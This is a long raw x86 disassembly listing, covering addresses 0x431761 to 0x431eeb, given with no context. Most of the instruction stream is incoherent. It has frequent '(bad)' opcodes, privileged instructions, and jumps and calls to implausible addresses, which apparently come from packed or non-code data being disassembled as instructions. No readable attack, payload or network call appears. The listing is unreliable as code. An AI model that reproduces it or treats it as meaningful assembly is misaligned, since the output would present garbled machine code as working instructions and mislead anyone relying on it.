  431761:	mov    edx,DWORD PTR [ebp-0x20]
  431764:	jb     0x431731
  431766:	mov    ecx,esi
  431768:	cld    
  431769:	scas   eax,DWORD PTR es:[edi]
  43176a:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  431771:	mov    BYTE PTR [eax],0x8c
  431774:	push   0xffffff99
  431776:	push   edi
  431777:	xor    dl,BYTE PTR [eax+0x3b]
  43177a:	mov    ecx,DWORD PTR [edi]
  43177c:	call   0x8c425cdf
  431781:	mov    eax,eax
  431783:	in     al,dx
  431784:	jge    0x4317d3
  431786:	mov    DWORD PTR [ebx],esi
  431788:	int3   
  431789:	add    eax,DWORD PTR [ebp+0xf]
  43178c:	xor    eax,ecx
  43178e:	(bad)  
  43178f:	dec    ebp
  431790:	pushf  
  431791:	xor    ecx,esi
  431793:	add    edi,DWORD PTR [edi]
  431795:	mov    eax,DWORD PTR [ebp-0x38]
  431798:	(bad)  
  431799:	test   dh,dl
  43179b:	cdq    
  43179c:	add    esi,DWORD PTR [edx]
  43179e:	jmp    0x431729
  4317a0:	mov    cl,al
  4317a2:	add    eax,0x14330f45
  4317a7:	mov    ecx,0xff448d80
  4317ac:	jmp    0xc9902779
  4317b1:	mov    edx,ecx
  4317b3:	rol    BYTE PTR [ebp+0x330155],1
  4317b9:	add    ecx,DWORD PTR [ebp+0xf]
  4317bc:	xor    eax,edx
  4317be:	(bad)  
  4317bf:	ror    DWORD PTR [eax],0x86
  4317c2:	jb     0x4317c1
  4317c4:	add    bh,bh
  4317c6:	clc    
  4317c7:	inc    ebp
  4317c8:	jb     0x431834
  4317ca:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  4317d0:	mov    ebx,DWORD PTR ss:[eax+ebx*8+0x68c000c7]
  4317d8:	ret    
  4317d9:	xor    al,bh
  4317db:	add    BYTE PTR [ebp+0x75],al
  4317de:	ss push 0xffffff9c
  4317e1:	inc    edi
  4317e3:	adc    al,0xe8
  4317e5:	inc    ebp
  4317e6:	test   DWORD PTR [ebp-0x7cba8b08],eax
  4317ec:	mov    ecx,DWORD PTR [eax]
  4317ee:	cld    
  4317ef:	or     DWORD PTR [ebp-0x34],0x33
  4317f3:	jbe    0x4317f8
  4317f5:	mov    edx,DWORD PTR [ecx+0x2b]
  4317f8:	dec    ebp
  4317f9:	mov    cl,BYTE PTR [ebx+0x45d801]
  4317ff:	mov    BYTE PTR [ebx],dh
  431801:	mov    eax,DWORD PTR [ebx]
  431803:	or     BYTE PTR [ecx+0x3b],dl
  431806:	dec    ebp
  431807:	int3   
  431808:	xor    ebp,edi
  43180a:	add    eax,DWORD PTR [ebp+0x51]
  43180d:	mov    ecx,DWORD PTR [ebp-0x28]
  431810:	xor    eax,DWORD PTR [eax]
  431812:	add    ebp,DWORD PTR [eax+0x51]
  431815:	adc    BYTE PTR [eax+0x0],0x8b
  431819:	add    BYTE PTR [ebx+0x4d18fcff],cl
  43181f:	inc    ebp
  431820:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  431826:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  43182c:	dec    ebp
  43182d:	mov    esi,DWORD PTR [ebx]
  43182f:	hlt    
  431830:	add    eax,ebx
  431832:	push   ecx
  431833:	inc    ebp
  431834:	dec    ebp
  431835:	(bad)  
  431836:	call   esi
  431838:	in     al,0xc7
  43183a:	retf   
  43183b:	mov    al,ds:0xc1ff39ce
  431840:	adc    al,0xc6
  431842:	inc    ebp
  431843:	and    eax,0x9c0f4c85
  431848:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  43184f:	cmp    BYTE PTR [ebx+0x3a],0x0
  431853:	mov    dh,0xc7
  431855:	cmp    eax,eax
  431857:	jne    0x454410a3
  43185d:	mov    edi,DWORD PTR [eax]
  43185f:	mov    eax,0x848bcb9c
  431864:	rcr    BYTE PTR [ecx-0x7c7fcd0f],0x67
  43186b:	or     BYTE PTR [edi],cl
  43186d:	(bad)  
  43186e:	dec    ebp
  43186f:	inc    edi
  431870:	add    bh,0x51
  431873:	or     cl,ch
  431875:	test   DWORD PTR [eax+0x4d4501f8],ecx
  43187b:	xchg   DWORD PTR [eax-0x1638ae64],eax
  431881:	mov    esp,0xf802b588
  431886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431887:	inc    ebp
  431888:	(bad)  
  431889:	cmp    bh,bh
  43188b:	pushf  
  43188c:	or     DWORD PTR [ecx+0x45ffe474],0x0
  431893:	mov    ecx,DWORD PTR [ebp-0x340018]
  431899:	into   
  43189a:	dec    DWORD PTR [ebx-0x7f72431c]
  4318a0:	push   0x5000ff01
  4318a5:	retf   
  4318a6:	inc    ebp
  4318a7:	into   
  4318a8:	dec    DWORD PTR [ebx-0x343f3ff4]
  4318ae:	push   eax
  4318af:	into   
  4318b0:	call   0x4b1d40
  4318b5:	retf   
  4318b6:	add    dh,cl
  4318b8:	add    bh,bh
  4318ba:	mov    DWORD PTR [eax+ecx*1],edx
  4318bd:	clc    
  4318be:	inc    ebp
  4318bf:	inc    ebp
  4318c0:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  4318c6:	push   0x1
  4318c8:	push   edi
  4318c9:	add    BYTE PTR [eax-0x35],dl
  4318cc:	mov    ecx,esi
  4318ce:	cld    
  4318cf:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  4318d5:	into   
  4318d6:	ror    BYTE PTR [ebx+0x75000800],0x50
  4318dd:	xor    eax,DWORD PTR [ebp+0x3]
  4318e0:	jne    0x431933
  4318e2:	call   DWORD PTR [eax-0x3c]
  4318e5:	mov    DWORD PTR [ecx-0x18],edx
  4318e8:	mov    edi,edi
  4318ea:	call   0x8b465e73
  4318ef:	add    ah,ah
  4318f1:	rol    BYTE PTR [ebp-0x7c],0xeb
  4318f5:	add    edi,edi
  4318f7:	add    al,ch
  4318f9:	inc    ebp
  4318fa:	push   ecx
  4318fb:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  431901:	mov    al,0xc7
  431903:	test   esp,esp
  431905:	clc    
  431906:	test   DWORD PTR [ebp-0x8],ecx
  431909:	add    BYTE PTR [ebp+0x51],0x39
  43190d:	jmp    0x8bcca1ae
  431912:	in     al,dx
  431913:	or     BYTE PTR [ebp-0xf],al
  431916:	xor    eax,DWORD PTR [eax+0x4f896703]
  43191c:	hlt    
  43191d:	mov    eax,DWORD PTR [ebp-0x50]
  431920:	xor    esi,ecx
  431922:	add    eax,DWORD PTR [eax+0x4f086789]
  431928:	inc    ebp
  431929:	adc    esi,0x68
  43192c:	pushf  
  43192d:	inc    edi
  43192f:	add    al,ch
  431931:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431932:	test   edi,edi
  431934:	clc    
  431935:	inc    DWORD PTR [ebp-0x73]
  431938:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  43193c:	(bad)  
  43193d:	push   ecx
  43193e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43193f:	jne    0x4318c6
  431941:	push   eax
  431942:	clc    
  431943:	test   DWORD PTR [ebp-0x1],eax
  431946:	cmp    eax,0xc78b9cff
  43194b:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  431952:	inc    ebp
  431953:	push   edi
  431954:	aas    
  431955:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  43195c:	dec    ebp
  43195d:	add    BYTE PTR [ebx],dh
  43195f:	inc    ebp
  431960:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  431966:	enter  0x8401,0x0
  43196a:	add    al,BYTE PTR [eax]
  43196c:	add    bh,bh
  43196e:	out    dx,eax
  43196f:	sbb    BYTE PTR [eax],al
  431971:	dec    ebp
  431972:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  431978:	sub    esi,DWORD PTR [ebx]
  43197a:	mov    ebp,DWORD PTR [eax-0x8]
  43197d:	add    bl,0x0
  431980:	(bad)  
  431981:	cmp    eax,ecx
  431983:	or     BYTE PTR [edx+0x750114],al
  431989:	inc    DWORD PTR [ebp+0x18]
  43198c:	mov    eax,DWORD PTR [ebp-0x8]
  43198f:	mov    ebx,eax
  431991:	(bad)  
  431992:	retf   
  431993:	inc    ebp
  431994:	into   
  431995:	mov    esi,eax
  431997:	int3   
  431998:	scas   eax,DWORD PTR es:[edi]
  431999:	push   es
  43199a:	mov    esi,DWORD PTR [ebp-0xc]
  43199d:	call   DWORD PTR [ebp+0x18]
  4319a0:	sub    edi,DWORD PTR [ebp+0x3b]
  4319a3:	mov    esi,DWORD PTR [edi-0x34]
  4319a6:	mov    eax,DWORD PTR [ebp-0x8]
  4319a9:	ss ret 
  4319ab:	pushf  
  4319ac:	mov    bh,0xbc
  4319af:	fadd   QWORD PTR [eax]
  4319b1:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  4319b7:	mov    esi,DWORD PTR [ebx]
  4319b9:	in     al,0x33
  4319bb:	ret    
  4319bc:	add    eax,esi
  4319be:	add    eax,DWORD PTR [ebp+0xf]
  4319c1:	mov    eax,ecx
  4319c3:	in     al,0x4d
  4319c5:	ret    
  4319c6:	mov    eax,esi
  4319c8:	in     al,dx
  4319c9:	inc    ebp
  4319ca:	rol    edi,1
  4319cc:	sar    al,1
  4319ce:	or     BYTE PTR [ebp+0x45e9f845],al
  4319d4:	add    BYTE PTR [eax],bh
  4319d6:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  4319dd:	test   ebx,eax
  4319df:	clc    
  4319e0:	retf   
  4319e1:	inc    ebp
  4319e2:	into   
  4319e3:	cmp    al,dh
  4319e5:	pushf  
  4319e6:	scas   eax,DWORD PTR es:[edi]
  4319e7:	(bad)  
  4319e8:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  4319ef:	inc    ebp
  4319f0:	cmp    edi,DWORD PTR [edi+esi*2]
  4319f3:	pushf  
  4319f4:	mov    eax,edi
  4319f6:	mov    esp,0x458567a8
  4319fb:	clc    
  4319fc:	mov    eax,DWORD PTR [ebp-0x8]
  4319ff:	mov    eax,ebx
  431a01:	in     al,dx
  431a02:	retf   
  431a03:	ret    
  431a04:	into   
  431a05:	mov    dh,0x7d
  431a08:	scas   eax,DWORD PTR es:[edi]
  431a09:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  431a0f:	add    BYTE PTR [ebx],ch
  431a11:	jmp    0xba1b51
  431a16:	mov    eax,DWORD PTR [ebp-0x5c]
  431a19:	mov    eax,DWORD PTR [ebp-0x14]
  431a1c:	inc    ebp
  431a1d:	enter  0x458b,0xf8
  431a21:	xor    eax,ebx
  431a23:	add    ecx,ebx
  431a25:	cmp    ecx,esi
  431a27:	shufps xmm7,xmm4,0xaf
  431a2b:	add    BYTE PTR [ebx+0x55e8f48b],cl
  431a31:	dec    ebp
  431a32:	sub    esi,DWORD PTR [ebx]
  431a34:	cmp    esi,DWORD PTR [ebx]
  431a36:	ja     0x431a3b
  431a38:	mov    eax,DWORD PTR [ebx]
  431a3a:	lods   al,BYTE PTR ds:[esi]
  431a3b:	mov    db0,ecx
  431a3e:	inc    ebp
  431a3f:	dec    ebp
  431a40:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  431a46:	retf   
  431a47:	rol    dh,1
  431a49:	or     al,0xce
  431a4b:	inc    ebp
  431a4c:	scas   eax,DWORD PTR es:[edi]
  431a4d:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  431a53:	add    BYTE PTR [ebx],ch
  431a55:	add    BYTE PTR [ebx],bh
  431a57:	inc    ebp
  431a58:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  431a5e:	inc    ebp
  431a5f:	retf   
  431a60:	mov    ecx,esi
  431a62:	clc    
  431a63:	(bad)  
  431a64:	retf   
  431a65:	scas   eax,DWORD PTR es:[edi]
  431a66:	ret    
  431a67:	mov    ecx,esi
  431a69:	hlt    
  431a6a:	(bad)  
  431a6b:	push   ebp
  431a6c:	scas   eax,DWORD PTR es:[edi]
  431a6d:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  431a73:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  431a79:	add    BYTE PTR [ebx],al
  431a7b:	mov    eax,eax
  431a7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431a7e:	inc    ebp
  431a7f:	dec    ebp
  431a80:	xor    ebx,DWORD PTR ss:[ebx+esi*1+0x3d00389]
  431a88:	inc    ebp
  431a89:	(bad)  
  431a8b:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  431a93:	sar    eax,1
  431a95:	rol    BYTE PTR [ebp+0x5],1
  431a98:	xor    eax,DWORD PTR [ebp+0x3]
  431a9b:	jmp    0x431a88
  431a9d:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  431aa3:	xor    eax,DWORD PTR [ebp+0x33]
  431aa6:	mov    eax,DWORD PTR [ebx]
  431aa8:	rol    BYTE PTR [ebx],1
  431aaa:	test   BYTE PTR [edi],cl
  431aac:	cdq    
  431aad:	shl    DWORD PTR [edx],0x4d
  431ab0:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  431ab6:	xor    edx,eax
  431ab8:	add    eax,DWORD PTR ds:0xeb4d45e0
  431abe:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  431ac4:	add    BYTE PTR [ebx],dh
  431ac6:	inc    ebp
  431ac7:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  431acd:	rdpmc  
  431acf:	rol    DWORD PTR [ebx],0x4d
  431ad2:	loopne 0x431a5f
  431ad4:	push   ebp
  431ad5:	in     al,dx
  431ad6:	mov    cl,dl
  431ad8:	adc    eax,edx
  431ada:	jb     0x431ae1
  431adc:	add    BYTE PTR [ebp+0x45],al
  431adf:	jmp    0x431a6c
  431ae1:	mov    ebx,eax
  431ae3:	test   al,0xcb
  431ae5:	dec    ebp
  431ae6:	dec    ebp
  431ae7:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  431aed:	add    ebx,DWORD PTR [ecx-0x743ecdf1]
  431af3:	dec    ebp
  431af4:	mov    al,0x8b
  431af6:	dec    ebp
  431af7:	in     al,dx
  431af8:	xor    edx,ecx
  431afa:	xor    edx,eax
  431afc:	add    eax,DWORD PTR [ebp+0x3]
  431aff:	jbe    0x431b10
  431b01:	mov    eax,ecx
  431b03:	test   al,0x45
  431b05:	dec    ebp
  431b06:	mov    DWORD PTR [ebx],esi
  431b08:	loopne 0x431b3d
  431b0a:	inc    ebp
  431b0b:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  431b11:	rol    esi,0x45
  431b14:	scas   eax,DWORD PTR es:[edi]
  431b15:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  431b1b:	mov    eax,ecx
  431b1d:	hlt    
  431b1e:	dec    ebp
  431b1f:	inc    ebp
  431b20:	mov    eax,edi
  431b22:	loopne 0x431afc
  431b24:	retf   
  431b25:	test   esi,ecx
  431b27:	clc    
  431b28:	scas   eax,DWORD PTR es:[edi]
  431b29:	inc    ebp
  431b2a:	mov    eax,edi
  431b2c:	fdiv   st,st(0)
  431b2e:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  431b34:	cdq    
  431b35:	cmp    BYTE PTR [edx],dh
  431b37:	pushf  
  431b38:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  431b3e:	inc    esi
  431b40:	mov    ebp,DWORD PTR [eax-0x10]
  431b43:	inc    ebp
  431b44:	dec    ebp
  431b45:	xor    esi,DWORD PTR [ebx]
  431b47:	add    eax,DWORD PTR [ebx]
  431b49:	loopne 0x431b5a
  431b4b:	dec    ebp
  431b4c:	ror    DWORD PTR [edx+0x7233084d],0x3
  431b53:	add    BYTE PTR [ebx-0x7b740bbb],cl
  431b59:	lock cdq 
  431b5b:	ret    
  431b5c:	xor    al,BYTE PTR [ebp-0x77]
  431b5f:	mov    esi,esp
  431b61:	rol    BYTE PTR [ebp-0x7c],1
  431b64:	xor    ebx,DWORD PTR [ecx-0x7772cd47]
  431b6a:	call   edi
  431b6c:	enter  0x4d45,0x8b
  431b70:	mov    esi,eax
  431b72:	fmul   st(3),st
  431b74:	push   ebp
  431b75:	dec    ebp
  431b76:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  431b7c:	ret    0xc199
  431b7f:	xor    al,BYTE PTR [esi-0x280276]
  431b85:	dec    ebp
  431b86:	jne    0x431bbb
  431b88:	mov    eax,DWORD PTR [ebx]
  431b8a:	cld    
  431b8b:	loopne 0x431b3d
  431b8d:	push   ebp
  431b8e:	add    DWORD PTR [eax+0x72851100],ecx
  431b94:	inc    DWORD PTR [eax]
  431b96:	inc    DWORD PTR [ebp-0x75]
  431b99:	mov    edi,esp
  431b9b:	lock add bl,0x1
  431b9f:	retf   
  431ba0:	add    dh,al
  431ba2:	xor    dh,cl
  431ba4:	inc    ebp
  431ba5:	scas   eax,DWORD PTR es:[edi]
  431ba6:	mov    eax,DWORD PTR [ebx]
  431ba8:	shl    al,0x0
  431bab:	inc    ebp
  431bac:	dec    DWORD PTR [ebx+0x4dccf0ff]
  431bb2:	call   0x462dea
  431bb7:	ud0    eax,ecx
  431bba:	adc    al,0x4d
  431bbc:	inc    ebp
  431bbd:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  431bc3:	lock push 0x338055
  431bc9:	add    eax,DWORD PTR [eax]
  431bcb:	ud0    ecx,edx
  431bce:	sbb    BYTE PTR [ebp+0x5e],dl
  431bd1:	xor    ecx,ecx
  431bd3:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  431bda:	push   ecx
  431bdb:	add    BYTE PTR [ebp-0x38],cl
  431bde:	mov    DWORD PTR [esi-0x740004],eax
  431be4:	cld    
  431be5:	inc    ebp
  431be6:	nop
  431be7:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  431bed:	xabort 0xaf
  431bf0:	icebp  
  431bf1:	mov    esi,DWORD PTR [ebp-0x28]
  431bf4:	(bad)  
  431bf5:	retf   
  431bf6:	or     ecx,eax
  431bf8:	(bad)  
  431bf9:	dec    ebp
  431bfa:	pop    es
  431bfb:	(bad)  
  431bfc:	(bad)  
  431bfd:	or     BYTE PTR [esi],al
  431bff:	jb     0x431bc7
  431c01:	add    BYTE PTR [ebx],al
  431c03:	inc    ebp
  431c04:	(bad)  
  431c05:	mov    ecx,DWORD PTR [edx]
  431c07:	fadd   st(6),st
  431c09:	ret    
  431c0a:	add    ah,BYTE PTR [edi-0x37]
  431c0d:	int    0x55
  431c0f:	sub    ebp,esp
  431c11:	add    edx,DWORD PTR [ecx-0x14]
  431c14:	inc    ebp
  431c15:	inc    ebp
  431c16:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  431c1c:	cld    
  431c1d:	(bad)  
  431c1e:	mov    WORD PTR [edi+0xf893be0],gs
  431c24:	mov    ebp,ebp
  431c26:	clc    
  431c27:	push   eax
  431c29:	push   DWORD PTR [ebp-0x4]
  431c2c:	mov    BYTE PTR [ebp+0xa],0xff
  431c30:	(bad)  
  431c31:	int3   
  431c32:	or     BYTE PTR [eax],al
  431c34:	(bad)  
  431c35:	lea    eax,[edi]
  431c37:	ins    BYTE PTR es:[edi],dx
  431c38:	(bad)  
  431c39:	inc    DWORD PTR [ecx]
  431c3b:	push   eax
  431c3c:	mov    BYTE PTR [ebp+0x9],0x8b
  431c40:	leave  
  431c41:	les    edx,FWORD PTR [ebp+0x0]
  431c44:	in     al,dx
  431c45:	call   DWORD PTR [ecx-0x75]
  431c48:	inc    ebp
  431c49:	cld    
  431c4a:	mov    DWORD PTR [eax+0x8b01fc],eax
  431c50:	cld    
  431c51:	xor    BYTE PTR [edi-0x76a8f98b],bh
  431c57:	std    
  431c58:	mov    eax,DWORD PTR [eax]
  431c5a:	clc    
  431c5b:	test   eax,esi
  431c5d:	je     0x431cd4
  431c5f:	mov    eax,esi
  431c61:	cld    
  431c62:	add    al,0x80
  431c64:	add    WORD PTR [ecx+0x0],ax
  431c68:	fiadd  DWORD PTR [eax]
  431c6a:	mov    BYTE PTR [eax],0xd6
  431c6d:	push   0xffffffc3
  431c6f:	push   edi
  431c70:	mov    edx,DWORD PTR [eax+0x51]
  431c73:	pop    edi
  431c74:	lea    ebx,[ebx-0x8]
  431c77:	ret    0x45
  431c7a:	mov    ecx,DWORD PTR [ebx-0x7243ae04]
  431c80:	xchg   eax,edi
  431c82:	mov    DWORD PTR [ebp-0x75],ecx
  431c85:	push   esi
  431c86:	clc    
  431c87:	jne    0x431c59
  431c89:	mov    ecx,0xf8450b0b
  431c8e:	(bad)  
  431c8f:	push   cs
  431c90:	or     BYTE PTR [ebp-0x3a],dh
  431c93:	cmp    eax,DWORD PTR [ecx]
  431c95:	pop    esi
  431c96:	(bad)  
  431c97:	or     al,0x5
  431c99:	inc    eax
  431c9a:	leave  
  431c9b:	jmp    0x40cf:0x21564204
  431ca2:	leave  
  431ca3:	jmp    0xdace5da7
  431ca8:	mov    eax,DWORD PTR [edx-0x3a]
  431cab:	jle    0x431ca3
  431cad:	inc    eax
  431cae:	nop
  431caf:	in     al,dx
  431cb0:	inc    ebx
  431cb2:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  431cb8:	add    eax,0xff45e8f8
  431cbd:	push   esi
  431cbe:	push   DWORD PTR [ebp-0x39]
  431cc1:	mov    eax,0x7e9da46
  431cc6:	or     al,0x6
  431cc8:	push   DWORD PTR [ebp-0x3a]
  431ccb:	cmp    eax,DWORD PTR [edx]
  431ccd:	pop    esi
  431cce:	ret    
  431ccf:	or     al,0x56
  431cd1:	inc    ecx
  431cd2:	push   ebp
  431cd3:	jle    0x431cc1
  431cd5:	inc    edx
  431cd6:	inc    ebp
  431cd7:	leave  
  431cd8:	add    DWORD PTR [ecx+0x28],eax
  431cdb:	and    esp,edi
  431cdd:	inc    ecx
  431cde:	jne    0x431cc7
  431ce0:	add    DWORD PTR [edx+0x1c],eax
  431ce3:	retf   0xc38b
  431ce6:	adc    al,0x8b
  431ce8:	xchg   edx,eax
  431ce9:	push   ecx
  431cea:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  431cf0:	rcl    DWORD PTR [esi-0x9],cl
  431cf3:	jne    0x431d45
  431cf5:	mov    eax,0x7c80ece
  431cfa:	rol    DWORD PTR [esi],cl
  431cfc:	div    DWORD PTR [ebp+0x50]
  431cff:	cmp    ecx,edx
  431d01:	pop    esi
  431d02:	dec    BYTE PTR [edx]
  431d04:	in     al,dx
  431d05:	inc    edx
  431d06:	sub    ebp,ebp
  431d08:	inc    eax
  431d09:	(bad)  
  431d0a:	push   eax
  431d0b:	add    edx,DWORD PTR [eax-0x13]
  431d0e:	push   edi
  431d0f:	add    dh,dh
  431d11:	leave  
  431d12:	adc    DWORD PTR [ebp-0x1],0xffffffec
  431d16:	add    BYTE PTR [ecx+0x0],dl
  431d19:	inc    ebp
  431d1a:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  431d20:	add    BYTE PTR [eax-0x7fbf448],bh
  431d26:	add    al,0x2
  431d28:	jmp    0x57ec882
  431d2d:	jne    0x431d17
  431d2f:	mov    eax,DWORD PTR [edx]
  431d31:	or     BYTE PTR [eax],al
  431d33:	inc    ecx
  431d34:	stc    
  431d35:	jmp    0xe7825d70
  431d3a:	jge    0x431d7d
  431d3c:	mov    esi,ebp
  431d3e:	lock ret 0x7d
  431d42:	and    ecx,DWORD PTR [ebx-0x171777]
  431d48:	add    bh,bh
  431d4a:	aad    0xd7
  431d4c:	add    dh,cl
  431d4e:	clts   
  431d50:	(bad)  
  431d51:	call   0xffce1c56
  431d56:	hlt    
  431d57:	iret   
  431d58:	jge    0x431d30
  431d5a:	rol    DWORD PTR [esi-0x80],cl
  431d5d:	cmc    
  431d5e:	or     BYTE PTR [edi-0x27],cl
  431d61:	(bad)  
  431d62:	out    dx,al
  431d63:	mov    eax,DWORD PTR [ebx]
  431d65:	(bad)  
  431d66:	pop    esi
  431d67:	push   es
  431d68:	cmp    al,0xe8
  431d6a:	sar    edi,0x8
  431d6d:	inc    DWORD PTR [edi]
  431d6f:	inc    esi
  431d70:	(bad)  
  431d71:	in     al,dx
  431d72:	jle    0x431dcb
  431d74:	push   cs
  431d75:	push   ebx
  431d76:	add    BYTE PTR [ebx+0x24008b56],cl
  431d7c:	add    BYTE PTR [ebp+0x50],al
  431d7f:	push   eax
  431d80:	add    DWORD PTR [ebx+0x757d1834],ecx
  431d86:	sub    edx,DWORD PTR [esi-0x24]
  431d89:	jne    0x431d41
  431d8b:	lods   eax,DWORD PTR ds:[esi]
  431d8c:	mov    edx,DWORD PTR [edx-0x34]
  431d8f:	dec    esi
  431d90:	out    0x83,eax
  431d92:	into   
  431d93:	push   edi
  431d95:	loopne 0x431d65
  431d97:	shr    BYTE PTR [edx+ecx*4+0x0],1
  431d9b:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  431da2:	rol    DWORD PTR [edx],0x8
  431da5:	mov    esp,ecx
  431da7:	cmp    DWORD PTR [ebx],0xc
  431daa:	mov    esi,0x5001c0
  431daf:	push   eax
  431db0:	push   cs
  431db1:	push   eax
  431db2:	(bad)  
  431db3:	sub    edx,edi
  431db5:	push   esi
  431db6:	adc    al,0xcb
  431db8:	ins    DWORD PTR es:[edi],dx
  431db9:	mov    eax,0x203e8
  431dbe:	add    al,ah
  431dc0:	ror    BYTE PTR [eax+0xc007c0],0xc0
  431dc7:	add    dh,al
  431dc9:	add    ah,ch
  431dcb:	rol    DWORD PTR [ebx-0x3595fb0d],1
  431dd1:	pop    ecx
  431dd2:	or     eax,ebx
  431dd4:	cli    
  431dd5:	add    BYTE PTR [ecx-0x4e728d1e],dh
  431ddb:	lea    ebp,[ebx]
  431ddd:	mov    edx,DWORD PTR [edx-0x4]
  431de0:	dec    ecx
  431de1:	inc    ebp
  431de2:	shr    BYTE PTR [ebx],0x4b
  431de5:	and    al,0x0
  431de7:	(bad)  
  431de8:	jne    0x431e2f
  431dea:	pop    eax
  431deb:	mov    al,0x5a
  431ded:	call   0x142204c
  431df2:	and    al,0x85
  431df4:	push   edx
  431df5:	add    BYTE PTR [eax+eax*1+0x0],ah
  431df9:	dec    ebp
  431dfa:	mov    cl,0x23
  431dfc:	jmp    0x431dea
  431dfe:	mov    al,0xe7
  431e00:	call   0x13920ee
  431e05:	shr    DWORD PTR [eax+ebx*2],cl
  431e08:	lock (bad) 
  431e0a:	adc    eax,0x757f008d
  431e0f:	out    0x58,eax
  431e11:	cmp    al,0x7
  431e13:	pop    edx
  431e14:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  431e1b:	push   ecx
  431e1c:	cld    
  431e1d:	mov    esi,0x3b0175
  431e22:	and    al,0xb0
  431e24:	xor    BYTE PTR [edx+0x1],0x8b
  431e28:	add    ah,bh
  431e2a:	mov    edi,DWORD PTR [ebp-0x4]
  431e2d:	psubsw mm7,QWORD PTR [edi]
  431e30:	add    DWORD PTR [ebp+0x0],ebp
  431e33:	rcr    eax,1
  431e35:	mov    edi,ecx
  431e37:	and    eax,DWORD PTR [eax]
  431e39:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  431e3f:	call   0x1302128
  431e44:	add    al,cl
  431e46:	mov    ebp,esi
  431e48:	aam    0x83
  431e4a:	or     DWORD PTR [ecx],eax
  431e4c:	jne    0x431e3f
  431e4e:	mov    eax,DWORD PTR [eax]
  431e50:	aam    0x0
  431e52:	dec    ebp
  431e53:	jne    0x431de0
  431e55:	cmp    ebx,eax
  431e57:	jb     0x431ea6
  431e59:	jmp    0x431de6
  431e5b:	mov    ebx,esp
  431e5d:	int3   
  431e5e:	dec    ebp
  431e5f:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  431e66:	mov    edx,0x8b0a8b
  431e6b:	cmp    ecx,DWORD PTR [eax]
  431e6d:	jb     0x431e46
  431e6f:	pop    edx
  431e70:	push   edi
  431e71:	cli    
  431e72:	pop    es
  431e73:	mov    eax,ecx
  431e75:	jb     0x431e79
  431e77:	add    DWORD PTR [ebx],0xa
  431e7a:	mov    eax,DWORD PTR [ebx]
  431e7c:	int3   
  431e7d:	add    bh,BYTE PTR [esi+0x75d10006]
  431e83:	jmp    0x431e10
  431e85:	mov    al,0xe8
  431e87:	call   0x1042109
  431e8c:	add    edx,DWORD PTR [ecx+ecx*8]
  431e8f:	pop    edi
  431e90:	or     BYTE PTR [ecx-0x73],bl
  431e93:	pop    ecx
  431e94:	inc    edi
  431e95:	xor    al,0xeb
  431e97:	push   ecx
  431e98:	mov    edi,DWORD PTR [edx+0xc506cc]
  431e9e:	call   0xb21fa3
  431ea3:	int3   
  431ea4:	sbb    BYTE PTR [esi],ch
  431ea6:	inc    ebp
  431ea7:	add    BYTE PTR [ebx-0x1f4f338b],cl
  431ead:	call   0x9c211c
  431eb2:	or     BYTE PTR [ebx-0x73],dl
  431eb5:	cmp    al,0x47
  431eb7:	mov    al,0x1
  431eb9:	jb     0x431ebb
  431ebb:	mov    al,0x10
  431ebd:	push   eax
  431ebe:	add    al,0x75
  431ec0:	add    BYTE PTR [ebx],ch
  431ec2:	add    ebx,esp
  431ec4:	int3   
  431ec5:	jne    0x431ed7
  431ec7:	movsx  edx,cl
  431eca:	add    DWORD PTR [eax],eax
  431ecc:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  431ed3:	mov    gs,edi
  431ed5:	add    BYTE PTR [eax-0x50],ch
  431ed8:	add    al,ch
  431eda:	mov    eax,DWORD PTR [ecx]
  431edc:	sub    eax,DWORD PTR [eax]
  431ede:	jb     0x431f55
  431ee0:	add    DWORD PTR [esp+eiz*8-0x50],esi
  431ee4:	jge    0x431ece
  431ee6:	add    al,0x1
  431ee8:	add    DWORD PTR [eax],0x0
  431eeb:	jne    0x431eed
